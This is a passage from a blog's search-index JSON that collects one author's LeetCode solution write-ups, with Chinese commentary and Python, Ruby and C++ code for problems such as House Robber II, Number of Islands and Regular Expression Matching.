1: return min(getN(n1,k-1), getN(n2,k-1)) else: a = getN(n1,k//2-1) b = getN(n2,k//2-1) #print(a,b,k-k//2) if a \u0026lt; b: #print(\u0026#39;n1\u0026#39;,n1[k//2:]) return f(n1[k//2:],n2,k-k//2) else: #print(\u0026#39;n2\u0026#39;,n2[k//2:]) return f(n1,n2[k//2:],k-k//2) class Solution: def findMedianSortedArrays(self, n1: List[int], n2: List[int]) -\u0026gt; float: left = (len(n1)+len(n2)+1)//2 right = (len(n1)+len(n2)+2)//2 print(f(n1,n2,left), left) print(f(n1,n2,right), right) return (f(n1,n2,left)+f(n1,n2,right))/2.0 ","permalink":"https://littlebees.github.io/2020/11/leetcode-4-median-of-two-sorted-arrays/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題體現了二分法是一種藝術\u003c/p\u003e","title":"leetcode-4 - Median of Two Sorted Arrays"},{"content":"動機 在奇偶性上做dp\nProblem Given an integer n, return an array ans of length n + 1 such that for each i (0 \u003c= i \u003c= n), ans[i] is the number of 1's in the binary representation of i.\nExample 1:\nInput: n = 2Output: [0,1,1]Explanation:0 --\u003e 01 --\u003e 12 --\u003e 10Example 2:\nInput: n = 5Output: [0,1,1,2,1,2]Explanation:0 --\u003e 01 --\u003e 12 --\u003e 103 --\u003e 114 --\u003e 1005 --\u003e 101 Constraints:\n0 \u003c= n \u003c= 105 Follow up:\nIt is very easy to come up with a solution with a runtime of O(n log n). Can you do it in linear time O(n) and possibly in a single pass?Can you do it without using any built-in function (i.e., like __builtin_popcount in C++)? Sol 數字可以分成奇偶， 如果是奇會變成2x+1這樣就是取x的總數加1 如果是偶會變成2x這樣就是取x的總數\ndp的index就是要追縱的目標(數字)，會顯示出input的資料是如何做遞迴的 而dp的結果也要能遞迴，能一次又一次累積上去 最後操縱dp值與index的就是動作\ndp = {} dp[1] = 1 dp[2] = 1 dp[0] = 0 def f(n): if n not in dp: if n%2 == 0: dp[n] = f(n/2) else: dp[n] = f((n-1)/2) + 1 return dp[n] class Solution: def countBits(self, num: int) -\u0026gt; List[int]: ans = [] for n in range(0,num+1): ans.append(f(n)) return ans ","permalink":"https://littlebees.github.io/2020/11/leetcode-338-counting-bits/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e在奇偶性上做dp\u003c/p\u003e","title":"leetcode-338 - Counting Bits"},{"content":"動機 控制input的dp\nProblem You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have a security system connected, and it will automatically contact the police if two adjacent houses were broken into on the same night.\nGiven an integer array nums representing the amount of money of each house, return the maximum amount of money you can rob tonight without alerting the police.\nExample 1:\nInput: nums = [2,3,2]Output: 3Explanation: You cannot rob house 1 (money = 2) and then rob house 3 (money = 2), because they are adjacent houses.Example 2:\nInput: nums = [1,2,3,1]Output: 4Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).Total amount you can rob = 1 + 3 = 4.Example 3:\nInput: nums = [0]Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 1000 \u003c= nums[i] \u003c= 1000 Ver1: TLE 假DP，真bfs\nfrom collections import deque class Solution: def rob(self, ns: List[int]) -\u0026gt; int: def toMark(i): a = (i + 1) % len(ns) b = i - 1 if i - 1 \u0026gt;= 0 else len(ns) - i - 1 ret = [a,b,i] ret.sort() return set(ret) dp = {} #set:: possible next location q = deque([tuple(range(0,len(ns)))]) dp[tuple(range(0,len(ns)))] = 0 ans = 0 while q: pos = q.popleft() set_pos = set(pos) for i in pos: next_pos = tuple(set_pos - toMark(i)) #print(next_pos,i,set_pos,toMark(i), dp[pos]) tmp = ns[i] + dp[pos] dp[next_pos] = tmp ans = max(ans,tmp) if next_pos: q.append(next_pos) return ans Ver2: AC 上一個做法是列舉所有可能的next_pos，這會有一些問題\n會到之前我們走過的點 在一個點上，我們無法確定之前是從哪個點過來的 如果一開始就造出不會有circular的Input，這樣就可以用House Robber的解法了，故 劃出範圍當成House Robber來做就好了， 看來這種不能用index來區分範圍的，不用考量到dp中\n@dp = nil @nums = nil def f(i) if @dp[i] != -1 return @dp[i] else ans = 0 (0..i-2).each { |j| ans = f(j) if f(j) \u0026gt; ans } @dp[i] = @nums[i] + ans end end def rob1(nums) return 0 if nums.nil? || nums.size == 0 @nums = nums @dp = Array.new(nums.size, -1) (0...nums.size).to_a.map { |n| f(n) }.max end def getRange(i,nums) a = i-1 \u0026gt;= 0 ? nums.size : nums.size + (i-1) b = (i+1) \u0026gt;= nums.size ? nums.size : (i+1) b+=1 return nums[b...a] end def rob(nums) ans = 0 nums.size.times do |i| ans = [ans,rob1(getRange(i,nums))+nums[i]].max end ans end ","permalink":"https://littlebees.github.io/2020/11/leetcode-213-house-robber-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e控制input的dp\u003c/p\u003e","title":"leetcode-213 - House Robber II"},{"content":"動機 就是一維的推廣\nProblem Given a 2D matrix matrix, handle multiple queries of the following type:\nCalculate the sum of the elements of matrix inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).Implement the NumMatrix class:\nNumMatrix(int[][] matrix) Initializes the object with the integer matrix matrix.int sumRegion(int row1, int col1, int row2, int col2) Returns the sum of the elements of matrix inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2). Example 1:\nInput[NumMatrix, sumRegion, sumRegion, sumRegion][[[[3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]], [2, 1, 4, 3], [1, 1, 2, 2], [1, 2, 2, 4]]Output[null, 8, 11, 12]ExplanationNumMatrix numMatrix = new NumMatrix([[3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]);numMatrix.sumRegion(2, 1, 4, 3); // return 8 (i.e sum of the red rectangle)numMatrix.sumRegion(1, 1, 2, 2); // return 11 (i.e sum of the green rectangle)numMatrix.sumRegion(1, 2, 2, 4); // return 12 (i.e sum of the blue rectangle) Constraints:\nm == matrix.lengthn == matrix[i].length1 \u003c= m, n \u003c= 200-105 \u003c= matrix[i][j] \u003c= 1050 \u003c= row1 \u003c= row2 \u003c m0 \u003c= col1 \u003c= col2 \u003c nAt most 104 calls will be made to sumRegion. Ver1: WA 假設 1 2 3 4 5 如果要求2 3 4可以用 1 2 3 4去減1，所以取的起點是原本的起點再往後推一格後再扣\n不過如果原本的起點是0，像求1 2 3這樣就尷尬了\nclass NumMatrix: def __init__(self, ms: List[List[int]]): self.origing_ms = ms for i in range(0,len(ms)): acc = 0 for j in range(0,len(ms[i])): acc += ms[i][j] ms[i][j] = acc #(acc,ms[i][j]) #for j in range(0,len(ms[0])): # acc = 0 # for i in range(0,len(ms)): # acc += ms[i][j][1] # ms[i][j] = (ms[i][j][0],acc) self.ms = ms def sumRegion(self, r1: int, c1: int, r2: int, c2: int) -\u0026gt; int: if r1 == r2 and c1 == c2: return self.origing_ms[r1][c1] else: ret = 0 for i in range(r1,r2+1): ret += self.ms[i][c2] - self.ms[i][c1-1] return ret Ver2: AC 解法是替所有非法index回傳0，這樣不論怎麼加或減都沒事\nclass NumMatrix: def __init__(self, ms: List[List[int]]): #self.origing_ms = [[x for x in l] for l in ms] for i in range(0,len(ms)): acc = 0 for j in range(0,len(ms[i])): acc += ms[i][j] ms[i][j] = acc #(acc,ms[i][j]) #for j in range(0,len(ms[0])): # acc = 0 # for i in range(0,len(ms)): # acc += ms[i][j][1] # ms[i][j] = (ms[i][j][0],acc) self.ms = ms self.w = len(ms[0]) if len(ms) \u0026gt; 0 else -1 self.h = len(ms) def getMS(self,i,j): if i \u0026lt; 0 or j \u0026lt; 0 or i \u0026gt;= self.h or j \u0026gt;= self.w: return 0 else: return self.ms[i][j] def sumRegion(self, r1: int, c1: int, r2: int, c2: int) -\u0026gt; int: #if r1 == r2 and c1 == c2: # return self.origing_ms[r1][c1] #else: ret = 0 for i in range(r1,r2+1): #print(i,c1,c2,self.getMS(i,c2),self.getMS(i,c1-1)) ret += self.getMS(i,c2) - self.getMS(i,c1-1) return ret ","permalink":"https://littlebees.github.io/2020/11/leetcode-304-range-sum-query-2d-immutable/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是一維的推廣\u003c/p\u003e","title":"leetcode-304 - Range Sum Query 2D - Immutable"},{"content":"動機 經典的dfs\nProblem Given an m x n 2D binary grid grid which represents a map of '1's (land) and '0's (water), return the number of islands.\nAn island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid are all surrounded by water.\nExample 1:\nInput: grid = [ [1,1,1,1,0], [1,1,0,1,0], [1,1,0,0,0], [0,0,0,0,0]]Output: 1Example 2:\nInput: grid = [ [1,1,0,0,0], [1,1,0,0,0], [0,0,1,0,0], [0,0,0,1,1]]Output: 3 Constraints:\nm == grid.lengthn == grid[i].length1 \u003c= m, n \u003c= 300grid[i][j] is '0' or '1'. Sol 在做dfs時要注意\n有沒有走過已經走過的解 邊界條件 def dfs(g,i,j): if i \u0026lt; 0 or i \u0026gt;= len(g) or j \u0026lt; 0 or j \u0026gt;= len(g[i]) or g[i][j] == \u0026#39;0\u0026#39;: return else: g[i][j] = \u0026#39;0\u0026#39; dfs(g,i+1,j) dfs(g,i,j+1) dfs(g,i-1,j) dfs(g,i,j-1) class Solution: def numIslands(self, g: List[List[str]]) -\u0026gt; int: ans = 0 for i in range(0,len(g)): for j in range(0,len(g[i])): if g[i][j] == \u0026#39;1\u0026#39;: dfs(g,i,j) ans += 1 return ans ","permalink":"https://littlebees.github.io/2020/11/leetcode-200-number-of-islands/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e經典的dfs\u003c/p\u003e","title":"leetcode-200 - Number of Islands"},{"content":"動機 經典的dp\nProblem Given a triangle array, return the minimum path sum from top to bottom.\nFor each step, you may move to an adjacent number of the row below. More formally, if you are on index i on the current row, you may move to either index i or index i + 1 on the next row.\nExample 1:\nInput: triangle = [[2],[3,4],[6,5,7],[4,1,8,3]]Output: 11Explanation: The triangle looks like: 2 3 4 6 5 74 1 8 3The minimum path sum from top to bottom is 2 + 3 + 5 + 1 = 11 (underlined above).Example 2:\nInput: triangle = [[-10]]Output: -10 Constraints:\n1 \u003c= triangle.length \u003c= 200triangle[0].length == 1triangle[i].length == triangle[i - 1].length + 1-104 \u003c= triangle[i][j] \u003c= 104 Follow up: Could you do this using only O(n) extra space, where n is the total number of rows in the triangle? Sol 每個點都是由上面的兩個點的總和構成，遞迴 每個點都是index，dp\ndef legal(i,len) i \u0026gt;= 0 \u0026amp;\u0026amp; i \u0026lt; len end def minimum_total(tri) i = 1 while i \u0026lt; tri.size tri[i].each_with_index do |n,j| maxN = Float::INFINITY maxN = [maxN, tri[i-1][j]].min if legal(j ,tri[i-1].size) maxN = [maxN, tri[i-1][j-1]].min if legal(j-1,tri[i-1].size) tri[i][j] += maxN end #p tri[i] i += 1 end tri[-1].min end ","permalink":"https://littlebees.github.io/2020/11/leetcode-120-triangle/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e經典的dp\u003c/p\u003e","title":"leetcode-120 - Triangle"},{"content":"動機 詳細的可以看Algorithm, Leetcode-31\n步驟 找合法的升序或降序到哪 把前一個數字換到這個序列 reverse這序列 next perm def findStartOfRevOrder(arr): i = len(arr)-1 # start from the last index while i \u0026gt; 0 and arr[i-1] \u0026gt;= arr[i]: i -= 1 return i if i \u0026gt; 0 else -1 def f(arr): i = findStartOfRevOrder(arr)-1 while i \u0026gt;= 0: j = len(arr)-1 while j \u0026gt;= 0 and arr[i] \u0026gt;= arr[j]: # keep the small ones in last AND skip the pos with the same digit j -= 1 if j \u0026gt;= 0: # swap arr[i], arr[j] = [arr[j],arr[i]] arr[i+1:] = arr[i+1:][::-1] # keep big digit as the last i = findStartOfRevOrder(arr)-1 yield arr else: break prev perm def findStartOfAscOrder(arr): i = len(arr)-1 # start from the last index while i \u0026gt; 0 and arr[i-1] \u0026lt;= arr[i]: i -= 1 return i if i \u0026gt; 0 else -1 def g(arr): i = findStartOfAscOrder(arr)-1 while i \u0026gt;= 0: j = len(arr)-1 while j \u0026gt;= 0 and arr[i] \u0026lt;= arr[j]: # keep the small ones in last AND skip the pos with the same digit j -= 1 if j \u0026gt;= 0: # swap arr[i], arr[j] = [arr[j],arr[i]] arr[i+1:] = arr[i+1:][::-1] # keep small digit as the last i = findStartOfAscOrder(arr)-1 yield arr else: break ","permalink":"https://littlebees.github.io/2020/11/%E4%B8%8B%E4%B8%80/%E5%89%8D%E4%B8%80%E6%8E%92%E5%BA%8F/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e詳細的可以看\u003ca href=\"/2020/11/leetcode-31\"\u003eAlgorithm, Leetcode-31\u003c/a\u003e\u003c/p\u003e","title":"下一/前一排序"},{"content":"動機 dp就是把所有可能性，encode成index在matrix上記錄，在求解時利用index去取得答案\nProblem Given an input string s and a pattern p, implement regular expression matching with support for '.' and '*' where:\n'.' Matches any single character.ââââ'*' Matches zero or more of the preceding element.The matching should cover the entire input string (not partial).\nExample 1:\nInput: s = aa, p = aOutput: falseExplanation: a does not match the entire string aa.Example 2:\nInput: s = aa, p = a*Output: trueExplanation: '*' means zero or more of the preceding element, 'a'. Therefore, by repeating 'a' once, it becomes aa.Example 3:\nInput: s = ab, p = .*Output: trueExplanation: .* means zero or more (*) of any character (.).Example 4:\nInput: s = aab, p = c*a*bOutput: trueExplanation: c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches aab.Example 5:\nInput: s = mississippi, p = mis*is*p*.Output: false Constraints:\n1 \u003c= s.length \u003c= 201 \u003c= p.length \u003c= 30s contains only lowercase English letters.p contains only lowercase English letters, '.', and '*'.It is guaranteed for each appearance of the character '*', there will be a previous valid character to match. Sol // 0 is 沒初始化，1是match，-1是mismatch int dp[1000][1000]; class Solution { public: void initDP() { memset(dp, 0, sizeof(dp)); } bool equalChar(char a,char b) { return b == \u0026#39;.\u0026#39; || a == b; } bool restAsterisk(int j,string\u0026amp; p) { for(;j \u0026gt;=0 \u0026amp;\u0026amp; p[j]==\u0026#39;*\u0026#39;;j-=2); return j \u0026lt; 0; } // i : S目前比對到哪 // j : P目前比對到哪 int f(int i,int j,string \u0026amp;S,string \u0026amp;P) { if(j \u0026lt; 0 \u0026amp;\u0026amp; i \u0026lt; 0) // 都沒得比了就是match return 1; else if(j \u0026lt; 0) // pattern沒得比，S還有剩，mismatch return -1; else if(i \u0026lt; 0) // pattern還有剩，S沒得比，看剩下的是不是都是星號 return restAsterisk(j,P) ? 1 : -1; else if(dp[i][j] == 0) // 在dp上沒有被算過 if(P[j] == \u0026#39;*\u0026#39;) { // P是星號 // 星號就要列舉沒match到所有能match的case dp[i][j] = f(i,j-2,S,P); // \u0026lt;c\u0026gt;* doesnt match anything for(int k=i;k\u0026gt;=0 \u0026amp;\u0026amp; equalChar(S[k],P[j-1]);k--) if(f(k-1,j-2,S,P)\u0026gt;0) dp[i][j] = f(k-1,j-2,S,P); } else // P是字元 dp[i][j] = equalChar(S[i],P[j]) ? f(i-1,j-1,S,P) : false; else; return dp[i][j]; } bool isMatch(string s, string p) { initDP(); return f(s.size()-1,p.size()-1,s,p) \u0026gt; 0; } }; TODO 很明顯其他solution的code比較短要再review\n","permalink":"https://littlebees.github.io/2020/11/leetcode-10-regular-expression-matching/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003edp就是把所有可能性，encode成index在matrix上記錄，在求解時利用index去取得答案\u003c/p\u003e","title":"leetcode-10 - Regular Expression Matching"},{"content":"動機 的確是dp，但也可以不用dp\u0026hellip; 好像只要是回文都可以用列舉中央去解\nProblem Given a string s, return the longest palindromic substring in s.\nExample 1:\nInput: s = babadOutput: babNote: aba is also a valid answer.Example 2:\nInput: s = cbbdOutput: bbExample 3:\nInput: s = aOutput: aExample 4:\nInput: s = acOutput: a Constraints:\n1 \u003c= s.length \u003c= 1000s consist of only digits and English letters. Ver1: TLE 定義dp[i][j]為s[i:j]的回文長度，如果不是回文就是0\n所以可以列舉所有可能的子字串，去看\n但是要怎麼加速?\n通常列舉的資料如果是可以遞迴的或是可以一層一層的疊上去就可以考慮用dp 但就算是列舉的資料如果是可以遞迴的或是可以一層一層的疊上去，如果其內容不與其他答案重疊，就會變成Divide and Conquer\n@DP = Array.new(1000) {Array.new(1000,nil)} def f(s,i,j,dp) if !dp[i][j] if i \u0026gt;= s.size || j \u0026lt; 0 || i \u0026gt; j dp[i][j] = -1 elsif s[i] == s[j] \u0026amp;\u0026amp; i+1 \u0026lt; s.size \u0026amp;\u0026amp; j-1 \u0026gt;= 0 \u0026amp;\u0026amp; i+1 \u0026lt;= j-1 ret = f(s,i+1,j-1,dp) if ret \u0026gt; 0 dp[i][j] = 2 + ret else dp[i][j] = 0 end else dp[i][j] = 0 end end return dp[i][j] end def find_out_continuousSeq(s,dp) cc = nil acc = 0 old = 0 s.each_char.with_index do |c,i| if c == cc acc += 1 dp[i-acc][i] = dp[i-acc][i-1] + 1 else acc = 0 end cc = c end end def longest_palindrome(s) #dp = Array.new(s.size){Array.new(s.size,nil)} dp = @DP dp.map! {|x| x.fill(nil)} ans = 0 str = \u0026#34;\u0026#34; (0...s.size).each {|x| dp[x][x] = 1} find_out_continuousSeq(s,dp) (0...s.size).each do |i| break if (s.size-i) \u0026lt; ans ((i+ans)...s.size).each do |j| f(s,i,j,dp) old = ans ans = [ans,f(s,i,j,dp)].compact.max if ans \u0026gt; old i, j = [i,j].sort str = s[i..j] old = ans end end end return str end 寫到後面才想起，Ruby與Python不能操作巨大的array 十分耗時\n如果要的話，就用hash table替代\nVer2: AC // i~j之間的回文長度，不是回文就是0 int dp[1000][1000] = {-2}; class Solution { public: int f(string \u0026amp;s,int i,int j) { if(dp[i][j] == -2) { if(i \u0026gt;= s.length() || j \u0026lt; 0 || i \u0026gt; j) dp[i][j] = -1; else if(s[i] == s[j] \u0026amp;\u0026amp; i+1 \u0026lt; s.length() \u0026amp;\u0026amp; j-1 \u0026gt;= 0 \u0026amp;\u0026amp; i+1 \u0026lt;= j-1) { int ret = f(s,i+1,j-1); dp[i][j] = ret \u0026gt; 0 ? ret+2 : 0; } else dp[i][j] = 0; } return dp[i][j]; } void initDP() { for(int i=0;i\u0026lt;1000;i++) for(int j=0;j\u0026lt;1000;j++) dp[i][j] = -2; for(int i=0;i\u0026lt;1000;i++) dp[i][i] = 1; } void find_out_continuousSeq(string \u0026amp;s) { char cc=\u0026#39;-\u0026#39;; int acc = 0; for(int i=0;i\u0026lt;s.length();i++) { if(s[i] == cc) acc++, dp[i-acc][i] = dp[i-acc][i-1] + 1; else acc = 0; cc = s[i]; } } string longestPalindrome(string s) { int a=0,b=0; initDP(); int ans = 0; find_out_continuousSeq(s); //先找出連續的string baaab的aaa for(int i=0;i\u0026lt;s.length();i++) { if(s.length()-i \u0026lt; ans) break; for(int j=i+ans;j\u0026lt;s.length();j++){ int old = ans; ans = max(ans,f(s,i,j)); if(ans\u0026gt;old) a=i,b=j,old=ans; } } //cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt;\u0026#39;,\u0026#39;\u0026lt;\u0026lt;a \u0026lt;\u0026lt;\u0026#39;,\u0026#39;\u0026lt;\u0026lt;b\u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return s.substr(a,b-a+1); } }; 比較短的DP，但在py會TLE class Solution: def longestPalindrome(self, s: str) -\u0026gt; str: @cache def isPalin(i,j): if j-i \u0026lt; 0: return False elif j-i == 1 or j-i == 0: return True else: return s[i] == s[j-1] and isPalin(i+1,j-1) a,b = 0,0 for i in range(len(s)): for j in range(i+1,len(s)+1): if j-i \u0026gt; b-a and isPalin(i,j): a,b=i,j return s[a:b] 列舉中央 列舉中央開始擴展回文也是n平方!! 同時這也是py能被AC的解\nclass Solution: def longestPalindrome(self, s: str) -\u0026gt; str: def center(a,b): while 0 \u0026lt;= a \u0026lt; len(s) and 0 \u0026lt;= b \u0026lt; len(s) and s[a] == s[b]: a,b = a-1,b+1 return [a+1,b] x,y = 0,0 for i in range(len(s)): for (a,b) in [center(i,i), center(i-1,i)]: if 0 \u0026lt;= a \u0026lt; len(s) and 0 \u0026lt; b \u0026lt;= len(s) and y-x \u0026lt; b-a: x,y=a,b return s[x:y] ","permalink":"https://littlebees.github.io/2020/11/leetcode-5-longest-palindromic-substring/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e的確是dp，但也可以不用dp\u0026hellip;\n好像只要是回文都可以用列舉中央去解\u003c/p\u003e","title":"leetcode-5 - Longest Palindromic Substring"},{"content":"動機 就是算數，但不要被資料結構的postfix誤導，堅持都用stack的方式去iterate所有數字\nProblem Given a string s which represents an expression, evaluate this expression and return its value. The integer division should truncate toward zero.\nNote: You are not allowed to use any built-in function which evaluates strings as mathematical expressions, such as eval().\nExample 1:\nInput: s = 3+2*2Output: 7Example 2:\nInput: s = 3/2 Output: 1Example 3:\nInput: s = 3+5 / 2 Output: 5 Constraints:\n1 \u003c= s.length \u003c= 3 * 105s consists of integers and operators ('+', '-', '*', '/') separated by some number of spaces.s represents a valid expression.All the integers in the expression are non-negative integers in the range [0, 231 - 1].The answer is guaranteed to fit in a 32-bit integer. Sol 當初是先想到stack，因為當初在資料結構就是用stack處理的\n會需要stack是因為要在有優先序不同的情況下先算其他高的運算\n但在遇到同樣高的運算時不能先放在stack之後再一起算，要當場直接算 還有如果stack中優先序比讀到的運算優先序還要高，也要當場直接算\ndef level(a): return 1 if (a in [\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;]) else 2 def applyOP(a,b,t): if t == \u0026#39;+\u0026#39;: return a + b elif t == \u0026#39;*\u0026#39;: return a * b elif t == \u0026#39;-\u0026#39;: return a - b else: return a // b def calc(arr): stk = [] stk2 = [] for t in arr: if t in [\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;/\u0026#34;]: if not stk: stk.append(t) else: if (level(stk[-1]) == 2 and level(t) == 2) or (level(stk[-1]) == 2 and level(t) == 1): # !! rhs = stk2.pop() lhs = stk2.pop() op = stk.pop() stk2.append(applyOP(lhs,rhs,op)) stk.append(t) else: stk2.append(int(t)) if stk and stk[-1] in [\u0026#34;*\u0026#34;,\u0026#34;/\u0026#34;]: op = stk.pop() rhs = stk2.pop() lhs = stk2.pop() stk2.append(applyOP(lhs,rhs,op)) ans = stk2[0] i = 1 #print(stk) #print(stk2) for op in stk: # 由左至右，不能用pop去算，不然會變成由右至左 lhs = stk2[i] ans = applyOP(ans,lhs,op) i += 1 return ans def parse(s): ret = [] tmp = \u0026#34;\u0026#34; for c in s: if c.isdigit(): tmp += c else: if tmp: ret.append(tmp) tmp = \u0026#34;\u0026#34; if c in [\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;/\u0026#34;]: ret.append(c) elif c == \u0026#34; \u0026#34;: continue if tmp: ret.append(tmp) return ret class Solution: def calculate(self, s: str) -\u0026gt; int: return calc(parse(s)) ","permalink":"https://littlebees.github.io/2020/11/leetcode-227-basic-calculator-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是算數，但不要被資料結構的postfix誤導，堅持都用stack的方式去iterate所有數字\u003c/p\u003e","title":"leetcode-227 - Basic Calculator II"},{"content":"動機 email會在不同的人之間重複，這樣要讓這兩個人合起來\n這裡的任務是\n如何找出有重複的人 如何合起來 Problem Given a list of accounts where each element accounts[i] is a list of strings, where the first element accounts[i][0] is a name, and the rest of the elements are emails representing emails of the account.\nNow, we would like to merge these accounts. Two accounts definitely belong to the same person if there is some common email to both accounts. Note that even if two accounts have the same name, they may belong to different people as people could have the same name. A person can have any number of accounts initially, but all of their accounts definitely have the same name.\nAfter merging the accounts, return the accounts in the following format: the first element of each account is the name, and the rest of the elements are emails in sorted order. The accounts themselves can be returned in any order.\nExample 1:\nInput: accounts = [[John,johnsmith@mail.com,john_newyork@mail.com],[John,johnsmith@mail.com,john00@mail.com],[Mary,mary@mail.com],[John,johnnybravo@mail.com]]Output: [[John,john00@mail.com,john_newyork@mail.com,johnsmith@mail.com],[Mary,mary@mail.com],[John,johnnybravo@mail.com]]Explanation:The first and third John's are the same person as they have the common email johnsmith@mail.com.The second John and Mary are different people as none of their email addresses are used by other accounts.We could return these lists in any order, for example the answer [['Mary', 'mary@mail.com'], ['John', 'johnnybravo@mail.com'], ['John', 'john00@mail.com', 'john_newyork@mail.com', 'johnsmith@mail.com']] would still be accepted.Example 2:\nInput: accounts = [[Gabe,Gabe0@m.co,Gabe3@m.co,Gabe1@m.co],[Kevin,Kevin3@m.co,Kevin5@m.co,Kevin0@m.co],[Ethan,Ethan5@m.co,Ethan4@m.co,Ethan0@m.co],[Hanzo,Hanzo3@m.co,Hanzo1@m.co,Hanzo0@m.co],[Fern,Fern5@m.co,Fern1@m.co,Fern0@m.co]]Output: [[Ethan,Ethan0@m.co,Ethan4@m.co,Ethan5@m.co],[Gabe,Gabe0@m.co,Gabe1@m.co,Gabe3@m.co],[Hanzo,Hanzo0@m.co,Hanzo1@m.co,Hanzo3@m.co],[Kevin,Kevin0@m.co,Kevin3@m.co,Kevin5@m.co],[Fern,Fern0@m.co,Fern1@m.co,Fern5@m.co]] Constraints:\n1 \u003c= accounts.length \u003c= 10002 \u003c= accounts[i].length \u003c= 101 \u003c= accounts[i][j] \u003c= 30accounts[i][0] consists of English letters.accounts[i][j] (for j \u003e 0) is a valid email. Sol 這題當初卡在是要用email還是人去認共同祖先\n但到後面(寫文章的現在)才意識到，要合起來就是共同祖先阿!! 所以直接看人就好(用人去在union find中合併)\n而email就是紀錄有沒有被重複登記即可\ndef parent(arr,i): while arr[i] != i: i = arr[i] return i def union(arr,i,j): a = parent(arr,i) b = parent(arr,j) arr[a] = b class Solution: def accountsMerge(self, ac: List[List[str]]) -\u0026gt; List[List[str]]: emails = {} arr = list(range(0,len(ac))) i = 0 for l in ac: for e in l[1:]: if e not in emails: emails[e] = i else: union(arr,i,emails[e]) i += 1 tbl = {} ks = sorted(emails.keys()) for e in ks: i = parent(arr,emails[e]) if i not in tbl: tbl[i] = [e] else: tbl[i].append(e) ret = [] for k in tbl: ret.append([ac[k][0]] + tbl[k]) return ret ","permalink":"https://littlebees.github.io/2020/11/leetcode-721-accounts-merge/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eemail會在不同的人之間重複，這樣要讓這兩個人合起來\u003c/p\u003e\n\u003cp\u003e這裡的任務是\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e如何找出有重複的人\u003c/li\u003e\n\u003cli\u003e如何合起來\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-721 - Accounts Merge"},{"content":"動機 這題是考細心，基本上一般人都知道做法， 但是要實作就是細細思考，處理小細節\n同時善用function去包常call的操作，降低實作的複雜度，以免在寫出來之前頭腦先爆炸\nProblem Given two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2, also represented as a string.\nNote: You must not use any built-in BigInteger library or convert the inputs to integer directly.\nExample 1:\nInput: num1 = 2, num2 = 3Output: 6Example 2:\nInput: num1 = 123, num2 = 456Output: 56088 Constraints:\n1 \u003c= num1.length, num2.length \u003c= 200num1 and num2 consist of digits only.Both num1 and num2 do not contain any leading zero, except the number 0 itself. Sol 每次都是一個digit去乘被乘數，第一個function\n被所有digit乘完後，就是把他們加起來，第二個function\n最後把前導的零刪掉\ndef mulDigit(arr,n): # 1 2 3 4 * 5 carry = 0 for i in reversed(range(0,len(arr))): tmp = arr[i] * n + carry carry, arr[i] = [tmp//10, tmp%10] if carry \u0026gt; 0: return [carry]+arr else: return arr def combine(a,b): # len(b) \u0026gt;= len(a) # 1 2 3 4 # 1 2 3 4 5 carry = 0 j = len(a) - 1 for i in reversed(range(0,len(b))): if j \u0026lt; 0: if carry \u0026gt; 0: b[i] += carry carry = 0 return b else: tmp = a[j] + b[i] + carry carry, b[i] = [tmp//10, tmp%10] j -= 1 if carry \u0026gt; 0: return [carry]+b else: return b def delLeadingZero(arr): for i in range(0,len(arr)): if arr[i] != 0: break if i \u0026lt; len(arr): return arr[i:] else: return [0] class Solution: def multiply(self, num1: str, num2: str) -\u0026gt; str: n1 = [int(c) for c in num1] n2 = [int(c) for c in num2] ret = [0] i = 0 for n in reversed(n2): #print(n1,n) tmp = mulDigit(n1[:],n) tmp += [0]*i #print(ret,tmp) ret = combine(ret, tmp) i += 1 return \u0026#39;\u0026#39;.join([str(n) for n in delLeadingZero(ret)]) ","permalink":"https://littlebees.github.io/2020/11/leetcode-43-multiply-strings/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題是考細心，基本上一般人都知道做法，\n但是要實作就是細細思考，處理小細節\u003c/p\u003e\n\u003cp\u003e同時善用function去包常call的操作，降低實作的複雜度，以免在寫出來之前頭腦先爆炸\u003c/p\u003e","title":"leetcode-43 - Multiply Strings"},{"content":"動機 這是經典演算法，基本上沒有寫過就要在面試時寫出來，應該十分困難\nProblem Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.\nIf such an arrangement is not possible, it must rearrange it as the lowest possible order (i.e., sorted in ascending order).\nThe replacement must be in place and use only constant extra memory.\nExample 